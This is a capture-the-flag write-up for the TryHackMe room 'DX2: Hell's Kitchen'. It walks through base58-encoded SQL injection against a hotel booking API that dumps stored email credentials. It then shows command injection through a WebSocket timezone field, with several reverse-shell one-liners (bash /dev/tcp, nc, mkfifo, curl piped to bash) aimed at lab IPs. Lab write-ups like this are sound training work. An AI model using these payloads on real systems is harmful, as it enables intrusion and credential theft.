<h1 align="center">DX2: Hell´s Kitchen</h1>
<p align="center">2025, October 18  &nbsp; .  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure on my <code>530</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>Can you help compromise a civilian machine that we believe is connected to the NSF? &nbsp;&nbsp;Access it <a href="https://tryhackme.com/room/dx2hellskitchen">here</a>.<br><br><img width="1200px" src="h"></p>

<h2>Task 1 . Investigate the server of an associate</h2>


<p>1.1. What is the flag at the end of the game?<br>
<code>THM{***************}</code></p>



```bash
xx.xxx.xx.xxx dx2.thm
```

```bash
:~# nmap -p- -T4 dx2.thm
...
PORT     STATE SERVICE
80/tcp   open  http
4346/tcp open  elanlm
```

```bash
:~# nmap -sC -sV -p80,4346 -T4 dx2.thm
...
PORT     STATE SERVICE VERSION
80/tcp   open  http
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 200 OK
|     content-length: 859
|     date: Sat, 18 Oct 2025 xx:xx:xx GMT
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="utf-8">
|     <title>Welcome to the 'Ton!</title>
|     <link rel="stylesheet" href="static/style.css"></link>
|     </head>
|     <body>
|     <div class="main">
|     <img src="static/hotel-logo.webp" alt="The 'Ton Hotel" />
|     <h1>Welcome to the 'Ton!</h1>
|     <h2>Fine Hotel Rooms, Hell's Kitchen, New York</h2>
|     <button id="booking" disabled>Book your Room</button>
|     <button onclick="window.location.href='/guest-book'">Guest Book</button>
|     <button onclick="window.location.href='/about-us'">About Us</button>
|     <img src="static/TonOutside.webp" alt="View from the Street" width="800px" />
|     </div>
|     <div class="footer">Copyright @ 2052</div>
|     <script src="static/check-roo
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     content-length: 0
|     date: Sat, 18 Oct 2025 xx:xx:xx GMT
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     content-length: 0
|     connection: close
|     date: Sat, 18 Oct 2025 xx:xx:xx GMT
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     content-length: 0
|     connection: close
|_    date: Sat, 18 Oct 2025 xx:xx:xx GMT
|_http-title: Welcome to the 'Ton!
4346/tcp open  elanlm?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 408 Request Timeout
|     content-length: 0
|     connection: close
|     date: Sat, 18 Oct 2025 xx:xx:xx GMT
|   GetRequest: 
|     HTTP/1.0 200 OK
|     content-length: 10909
|     date: Sat, 18 Oct 2025 xx:xx:xx GMT
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>NYCCOM.USERS.PUB</title>
|     <style>
|     html, body {
|     height: 100%;
|     background-color: black;
|     color: white;
|     font-family: 'Courier New', Courier, monospace;
|     font-size: 1em;
|     body {
|     margin: 0;
|     display: flex;
|     align-items: center;
|     justify-content: center;
|     .background {
|     width: 28em;
|     height: 7em;
|     background-color: #777;
|     position: absolute;
|     border-radius: 1em;
|     border: 0.2em solid #999;
|     clip-path: polygon(75% 0, 100% 100%, 100% 100%, 0 100%, 0 0);
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     content-length: 0
|     connection: close
|_    date: Sat, 18 Oct 2025 xx:xx:xx GMT
```

```bash
:~/DX2HellsKitchen# dirsearch -u http://dx2.thm
...
Target: http://dx2.thm/

[xx:xx:xx] Starting: 
[xx:xx:xx] 200 -    1KB - /about-us
[xx:xx:xx] 404 -   14B  - /static/dump.sql

Task Completed
```


```bash
:~/DX2HellsKitchen# dirsearch -u http://dx2.thm:4346/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
...
Target: http://dx2.thm:4346/

[xx:xx:xx] Starting: 
[xx:xx:xx] 403 -    0B  - /mail
[xx:xx:xx] 403 -    0B  - /ws

Task Completed
```


```bash
:~/DX2HellsKitchen# gobuster dir -u http://dx2.thm:4346/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
...
/mail                 (Status: 403) [Size: 0]
/ws                   (Status: 403) [Size: 0]
```

<img width="1055" height="413" alt="image" src="https://github.com/user-attachments/assets/3293265f-1b35-4707-8562-893b24b2ad21" />

<img width="1058" height="313" alt="image" src="https://github.com/user-attachments/assets/4a4e2236-2ad5-4100-ae63-62692dd2f258" />

<p>Book your Room</p>

<img width="1047" height="420" alt="image" src="https://github.com/user-attachments/assets/e60860fc-314a-462b-b907-b7f3f7c87fac" />

<p>Guest Book</p>

<img width="1055" height="564" alt="image" src="https://github.com/user-attachments/assets/6d490306-96a1-4950-82a6-dc97c32e0408" />

<p>Name 	City of Origin<br>
Gully Foyle 	New York<br>
Gabriel Syme 	London, England<br>
Paul Denton 	New York<br>
Oberst Enzian 	Sudwest, Africa<br>
Smilla Jasperson 	Copenhagen, Denmark<br>
Hippolyta Hall 	Los Angeles</p>


<p>About Us</p>

<img width="1060" height="706" alt="image" src="https://github.com/user-attachments/assets/7477c1b0-8415-432a-bde5-dcb529d37253" />

<p>dx2.thm/static/check-rooms.js</p>

<img width="1123" height="229" alt="image" src="https://github.com/user-attachments/assets/1093c1c6-4cbf-46ca-9fe3-650a7921aafa" />

<p>dx2.thm/new-booking</p>

<img width="1054" height="276" alt="image" src="https://github.com/user-attachments/assets/8616e766-dcdd-441b-9872-a4e869653085" />

<img width="1058" height="359" alt="image" src="https://github.com/user-attachments/assets/ede43fb3-685e-4029-843d-90100b02b760" />

<p>dx2.thm/static/new-booking.js</p>

<img width="1053" height="462" alt="image" src="https://github.com/user-attachments/assets/0957775c-c534-45ab-9590-3b90016e8a19" />

<img width="1059" height="186" alt="image" src="https://github.com/user-attachments/assets/46974c89-39da-4261-ad89-87ebe4bfb84b" />

<p>BOOKING_KEY:"55oYpt6n8TAVgZajV5aN2fVbr"</p>

<img width="1058" height="365" alt="image" src="https://github.com/user-attachments/assets/ac7d0900-b240-400a-b400-da5d4fe40095" />

<p>BOOKING_KEY:"55oYpt6n8TAVgZajV5aN2fVbr" Base58 decoded is <strong>>BOOKING_KEY:"booking_id:9622295"</strong></p>

<img width="843" height="213" alt="image" src="https://github.com/user-attachments/assets/c7d427d3-12ed-458b-a905-d72994e18009" />


<br>
<br>
<br>

```bash
/api/booking-info?booking_key=55oYpt6n8TAVgZajQf7kYApbm
not found 
```

<p>booking_id:1' OR 1=1 -- -<br>
gcHKyWA7PgMwFfnwduCP2qmyxzLFySmnBe</p>


```bash
/api/booking-info?booking_key=gcHKyWA7PgMwFfnwduCP2qmyxzLFySmnBe
not found 
```

<p>booking_id:1' ORDER BY 1 -- -<br>
5UBbpHLSVdeXKovifsoR7DGtABpdk3C5xzW69nG4</p>

```bash
/api/booking-info?booking_key=5UBbpHLSVdeXKovifsoR7DGtABpdk3C5xzW69nG4
not found 
```

<p>booking_id:1' ORDER BY 2 -- -<br>
5UBbpHLSVdeXKovifsoR7DGtABpdk3C5yVPGEGng</p>

```bash
/api/booking-info?booking_key=5UBbpHLSVdeXKovifsoR7DGtABpdk3C5yVPGEGng
not found
```

<p>booking_id:1' ORDER BY 3 -- -<br>
5UBbpHLSVdeXKovifsoR7DGtABpdk3C5yzGSJmKJ</p>

```bash
/api/booking-info?booking_key=5UBbpHLSVdeXKovifsoR7DGtABpdk3C5yzGSJmKJ
bad request
```

<p>booking_id:1' ORDER BY 4 -- -<br>
5UBbpHLSVdeXKovifsoR7DGtABpdk3C5zV9cPFqv</p>

```bash
/api/booking-info?booking_key=5UBbpHLSVdeXKovifsoR7DGtABpdk3C5zV9cPFqv
bad request
```

```bash
/api/booking-info?booking_key=ApfkkDrFctMBrXvW3fJPqtgiyDhrqKLGAWqaQpgwBY91n3Pa
{"room_num":"1","days":"2"}
```

<img width="1056" height="89" alt="image" src="https://github.com/user-attachments/assets/d3189d74-b331-469d-b521-fc536d23199a" />


```bash
/api/booking-info?booking_key=2DM1mNyoCy8z33ctQNHz7tsjQhQwGGJ7BfAkBoWA2fLSzeW1rezWoJm7LdfsGxVyg8EnY
{"room_num":"1","days":"3.42.0"}
```

<img width="1053" height="93" alt="image" src="https://github.com/user-attachments/assets/81ca5a52-2985-4a48-aa1e-7013e4f41b1d" />

```bash
/api/booking-info?booking_key=3fcdDXstvQBMjWHxTTY4rSpJ6j94tbFcTa7mQHUhBQKPjaSNqvhXzbC5knNsCQxwVfve8CVBUgAQk
{"room_num":"1","days":"CREATE TABLE bookings_temp (booking_id TEXT, room_num TEXT, days TEXT)"}root@ip-10-201-63-182:~/DX2HellsKitchen# 
```

<img width="1051" height="69" alt="image" src="https://github.com/user-attachments/assets/8ddc1c11-75d6-4d70-acda-ab7d69e940de" />


```bash
/api/booking-info?booking_key=3HN9EcFJMeWBq54x2Tk9DEGmpUKqvuGUDMnicRgmKLtQCKGoDqqz3iCpif7zzSjFD3qmzCJjZCP1uBpnTEsvgSs4oSALTFZ5FiRyV5aJfBz2MSBKDr5tk2nxZ3tYduYKgRvgakxTrRzntzzmdV4bmM1RVnzUCZAeVTocrhWZBuH428
{"room_num":"1","days":"email_access,reservations,bookings_temp"}
```

<img width="1060" height="73" alt="image" src="https://github.com/user-attachments/assets/11686a04-6ff9-43f9-bbec-1c825b69b204" />


```bash
/api/booking-info?booking_key=ACnMHD6J1XxN7kQu7LfMQWxJfpuVYz2wM2CXcUt398ns3iDxcvLbJ7mcbRKsN1Uk3p8MDfdmnsunVpCev7yTL4AaS7zvCz6ZtckRNq6yVA49Uy2QT4Rx7LKXTdpJiM8QsdNHpFuyma6Ugtkygvyka7ZQT2C3P7tQ
{"room_num":"1","days":"CREATE TABLE email_access (guest_name TEXT, email_username TEXT, email_password TEXT)"}
```

<img width="1055" height="71" alt="image" src="https://github.com/user-attachments/assets/daa6b723-497c-4037-a9d2-0472c8f379ca" />


<p>

- pdenton : 4321chameleon</p>

:~/DX2HellsKitchen# curl -s http://10.201.88.12/api/BOOKING_KEY?booking_key=e7Zicyo9Kq2pk6Ta8E7kEFnsVi7p2VAXKYEfVHZGpseKw9x3o8pAxGhdUhy6EYJanhRv9aMwyu8CKq9maeLfk8QHjEALv2j2B8WLyWypECM8R7bWhWBqf4GpXnyAcicrNuza7Qeb7m4riuWuWc
{"room_num":"NEVER LOGGED IN,NEVER LOGGED IN,NEVER LOGGED IN,pdenton,NEVER LOGGED IN,NEVER LOGGED IN","days":",,,4321chameleon,,"}


<p>

- log in :4346
</p>

<img width="1036" height="693" alt="image" src="https://github.com/user-attachments/assets/384fde30-94d2-4eb7-9bc3-b4a557a8a6c4" />



<img width="1027" height="103" alt="image" src="https://github.com/user-attachments/assets/5102e879-4c97-49b2-93ad-dadac13586a9" />


<p>

- https://beautifier.io/</p>

   < script type = "text/javascript" >
       let elems = document.querySelectorAll(".email_list .row");
   for (var i = 0; i < elems.length; i++) {
       elems[i].addEventListener("click", (e => {
           document.querySelector(".email_list .selected").classList.remove("selected"), e.target.parentElement.classList.add("selected");
           let t = e.target.parentElement.getAttribute("data-id"),
               n = e.target.parentElement.querySelector(".col_from").innerText,
               r = e.target.parentElement.querySelector(".col_subject").innerText;
           document.querySelector("#from_header").innerText = n, document.querySelector("#subj_header").innerText = r, document.querySelector("#email_content").innerText = "", fetch("/api/message?message_id=" + t).then((e => e.text())).then((e => {
               document.querySelector("#email_content").innerText = atob(e)
           }))
       })), document.querySelector(".dialog_controls button").addEventListener("click", (e => {
           e.preventDefault(), window.location.href = "/"
       }))
   }
   const wsUri = `ws://${location.host}/ws`;
   socket = new WebSocket(wsUri);
   let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
   socket.onmessage = e => document.querySelector(".time").innerText = e.data, setInterval((() => socket.send(tz)), 1e3); <
   /script>
                






<p>

- navigated to http://10.201.88.12:4346/api/message?message_id=1</p>

<img width="1039" height="120" alt="image" src="https://github.com/user-attachments/assets/edb87adf-5308-432b-83df-d495260d9382" />


<img width="814" height="281" alt="image" src="https://github.com/user-attachments/assets/3bed9e95-767d-4db8-b0a7-817a279acef4" />


<p>

- navigated to http://10.201.88.12:4346/api/message?message_id=2</p>

<img width="1039" height="89" alt="image" src="https://github.com/user-attachments/assets/b73af3d9-6ac1-44fb-aa2c-61ded4d8e2d9" />


<img width="834" height="484" alt="image" src="https://github.com/user-attachments/assets/054a79eb-7c43-45b2-bdae-f2697586d5d0" />



<p>

- navigated to http://10.201.88.12:4346/api/message?message_id=3</p>

<img width="1039" height="71" alt="image" src="https://github.com/user-attachments/assets/3191102a-11bb-427b-a0f9-b51058e4e73f" />


<img width="829" height="321" alt="image" src="https://github.com/user-attachments/assets/5d65880f-e476-400a-a55b-f2e98171db05" />


<p>

- navigated to http://10.201.88.12:4346/api/message?message_id=4</p>


<img width="825" height="400" alt="image" src="https://github.com/user-attachments/assets/23b6eb36-a4d1-4adf-b348-bff093f833af" />



<p>

- navigated to http://10.201.88.12:4346/api/message?message_id=5</p>

<img width="826" height="352" alt="image" src="https://github.com/user-attachments/assets/f67f93b7-0584-4841-8fad-b01d09dc4cc6" />



_____



bash -i >& /dev/tcp/10.201.58.165/4444 0>&1


bash -i >& /dev/tcp/10.10.124.116/12280 0>&1


tz_id = Intl.DateTimeFormat().resolvedOptions().timeZone + ';bash -i >& /dev/tcp/10.201.58.165/4444 0>&1';

socket.send(tz_id);


cat s
busybox nc 10.201.95.226 443 -e sh


UTC;curl 10.201.95.226:443/s;




<img width="1145" height="469" alt="image" src="https://github.com/user-attachments/assets/d0c7167e-195b-4dc0-a873-c518830491bc" />



rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.201.63.182 9001 >/tmp/f



~/DX2HellsKitchen# cat t
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.201.63.182 9001 >/tmp/f



:~/DX2HellsKitchen# nc -nlvp 9001
Listening on 0.0.0.0 9001


:~/DX2HellsKitchen# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...




socket.send("$(curl 10.201.63.182:8000/t|bash")






<img width="1145" height="469" alt="image" src="https://github.com/user-attachments/assets/b3bfd64e-aebc-4a23-9d95-5ee40236ee2c" />

<p>

- navigate to Burp Suite<br>
- Proxy<br>
- WebSockets history<br>
- right-click over an item<br>
- Send to Repeater<br>
- customize<br>
- Send</p>


Europe/London;cat /srv/.dad;



i cant deal with your attacks on my friends rn dad, i need to take some time away from the hotel. if you need access to the ton site, my pw is where id rather be: anywherebuthere. -S
Sat 18 Oct 2025 10:11:58 PM UTC



Europe/London;ls /home/;

gilbert
jojo
sandra
Sat 18 Oct 2025 10:15:26 PM UTC








:~/DX2HellsKitchen# curl -s http://10.201.88.12/api/booking-info?booking_key=$(echo -n "booking_id:1138907" | base58 -d)


:~/DX2HellsKitchen# curl -s http://10.201.88.12/api/booking-info?booking_key=$(echo -n "booking_id:1138907" | base58)
not found

:~/DX2HellsKitchen# curl -s http://10.201.88.12/api/booking-info?booking_key=$(echo -n "booking_id:2238907" | base58)
not found

:~/DX2HellsKitchen# curl -s http://10.201.88.12/api/booking-info?booking_key=$(echo -n "booking_id:2238907'" | base58)
bad request


:~/DX2HellsKitchen# curl -s http://10.201.88.12/api/booking-info?booking_key=$(echo -n "booking_id:2238907' UNION SELECT 1;-- -" | base58)
bad request


:~/DX2HellsKitchen# curl -s http://10.201.88.12/api/booking-info?booking_key=$(echo -n "booking_id:2238907' UNION SELECT 1,2;-- -" | base58)
{"room_num":"1","days":"2"}





















:~/DX2HellsKitchen# curl -s http://10.201.88.12/api/booking-info?booking_key=$(echo -n "booking_id:2238907' UNION SELECT GROUP_CONCAT(sql, '\n'),2 FROM sqlite_schema;-- -" | base58)
{"room_num":"CREATE TABLE email_access (guest_name TEXT, email_username TEXT, email_password TEXT)\\nCREATE TABLE reservations (guest_name TEXT, room_num INTEGER, days_remaining INTEGER)\\nCREATE TABLE bookings_temp (booking_id TEXT, room_num TEXT, days TEXT)","days":"2"}


:~/DX2HellsKitchen# curl -s http://10.201.88.12/api/booking-info?booking_key=$(echo -n "booking_id:2238907' UNION SELECT GROUP_CONCAT(sql, '\n'),2 FROM sqlite_schema;-- -" | base58) | jq -r
{
  "room_num": "CREATE TABLE email_access (guest_name TEXT, email_username TEXT, email_password TEXT)\\nCREATE TABLE reservations (guest_name TEXT, room_num INTEGER, days_remaining INTEGER)\\nCREATE TABLE bookings_temp (booking_id TEXT, room_num TEXT, days TEXT)",
  "days": "2"
}



:~/DX2HellsKitchen# curl -s http://10.201.88.12/api/booking-info?booking_key=$(echo -n "booking_id:2238907' UNION SELECT GROUP_CONCAT(guest_name || ':' || email_username || ':' || email_password,'\n'),2 FROM email_access;-- -" | base58) | jq -r
{
  "room_num": "Gully Foyle:NEVER LOGGED IN:\\nGabriel Syme:NEVER LOGGED IN:\\nOberst Enzian:NEVER LOGGED IN:\\nPaul Denton:pdenton:4321chameleon\\nSmilla Jasperson:NEVER LOGGED IN:\\nHippolyta Hall:NEVER LOGGED IN:",
  "days": "2"
}



# curl -s http://10.201.88.12/api/booking-info?booking_key=$(echo -n "booking_id:1138907' UNION SELECT GROUP_CONCAT( guest_name || '] : [' || email_username || '] : [' || email_password,'\n'),2 FROM email_access;-- -" | base58)



<img width="1273" height="139" alt="image" src="https://github.com/user-attachments/assets/aa9e3df7-c556-4f4b-a26c-88bb30483d8a" />









http://10.201.88.12:4346

<img width="956" height="392" alt="image" src="https://github.com/user-attachments/assets/48cea5b2-755a-45c3-8ea5-8bf5e4b34146" />



